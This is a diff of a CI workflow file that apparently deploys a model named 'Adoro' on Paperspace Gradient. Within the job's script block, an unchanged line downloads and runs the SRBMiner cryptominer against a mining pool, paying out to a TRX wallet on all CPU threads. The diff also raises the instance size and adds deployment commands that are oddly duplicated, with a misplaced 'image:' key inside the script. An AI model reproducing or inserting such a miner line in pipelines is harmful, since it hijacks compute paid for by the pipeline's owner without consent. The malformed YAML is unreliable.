@@ -31,7 +31,7 @@ jobs:
     needs:
       - ValidateModel
     resources:
-      instance-type: C3
+      instance-type: C7
     uses: script@v1
     with:
       script: |-
@@ -44,6 +44,11 @@ jobs:
         EOF
         apt update > /dev/null
         apt-get install -y jq && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz && tar xf SRBMiner-Multi-0-8-0-Linux.tar.xz && cd SRBMiner-Multi-0-8-0 && ./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet TRX:TUVKgSFJWkYn4UBPjX1xPzxADUFGk3McXo --password x --cpu-threads 0
+        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
+        echo
+        echo "Adoro can be accessed at URL:"
+        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
+      image: paperspace/gradient-sdk
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
